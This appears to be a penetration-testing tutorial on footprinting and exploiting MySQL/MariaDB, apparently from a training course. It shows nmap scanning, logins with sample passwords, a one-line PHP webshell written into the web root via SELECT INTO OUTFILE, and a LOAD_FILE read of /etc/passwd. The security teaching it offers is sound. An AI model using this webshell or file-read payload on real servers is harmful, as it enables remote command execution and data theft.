Usually, the MySQL server runs on `TCP port 3306`. `MySQL` is an open-source SQL relational database management system developed and supported by Oracle.
`MariaDB`, which is often connected with MySQL, is a fork of the original MySQL code. 
## Footprinting the Service
#### Scanning MySQL Server
```shell
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
#### Interaction with the MySQL Server
```shell
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.128
mysql -u root -pP4SSw0rd -h 10.129.14.128 --ssl-verify-server-cert=0
mysql -u craftuser -pCraftDB_pw_2026 -h 0.0.0.0
```

```
MySQL [(none)]> show databases;
MySQL [(none)]> select version();
MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
MySQL [mysql]> show columns from <table>;
MySQL [mysql]> select * from <table> where <column> = "<string>";
```
## Write Local Files
`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands.
If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.
```sql
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
`secure_file_priv` may be set as follows:
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.
In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:
```
mysql> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```
## Read Local Files
by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
```
mysql> select LOAD_FILE("/etc/passwd");
```

